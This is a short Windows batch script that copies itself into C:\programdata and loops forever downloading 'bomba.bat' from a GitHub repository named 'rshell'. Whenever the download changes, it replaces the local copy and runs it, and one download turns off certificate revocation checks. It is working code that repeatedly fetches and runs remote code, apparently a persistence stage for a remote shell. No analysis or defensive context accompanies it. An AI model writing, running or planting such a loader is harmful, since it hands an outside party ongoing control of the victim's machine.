@echo off
set d=%0
copy %d% C:\programdata
:start
IF EXIST C:\programdata\bomba.bat (
:loop
curl --output C:\programdata\bomba2.bat -L https://raw.githubusercontent.com/DMK787/rshell/main/bomba.bat
fc C:\programdata\bomba2.bat C:\programdata\bomba.bat>nul
if errorlevel 1 (
echo WORKED
del C:\programdata\bomba.bat
ren C:\programdata\bomba2.bat bomba.bat
start C:\programdata\bomba.bat
timeout /t 1
goto loop
) ELSE (
echo NOT WORKED
timeout /t 1
goto loop
)
) ELSE (
echo FILE NOT FOUND
curl --output C:\programdata\bomba.bat -L --ssl-no-revoke https://raw.githubusercontent.com/DMK787/rshell/main/bomba.bat
goto start
)
